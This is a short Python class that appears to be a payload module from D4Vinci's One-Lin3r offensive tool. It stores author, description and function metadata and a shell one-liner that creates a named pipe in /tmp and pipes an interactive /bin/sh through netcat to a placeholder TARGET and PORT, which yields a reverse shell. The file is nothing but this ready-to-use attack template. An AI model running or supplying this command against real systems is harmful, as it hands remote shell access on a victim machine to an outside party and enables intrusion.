class info:
    author      = "Karim shoair (D4Vinci)"
    description = "Uses mkfifo and netcat to establish a reverse shell."
    function    = "reverse shell"
    liner       = "if [ -e /tmp/VAR1 ];then rm /tmp/VAR1;fi;mkfifo /tmp/VAR1;cat /tmp/VAR1|/bin/sh -i 2>&1|nc TARGET PORT > /tmp/VAR1"
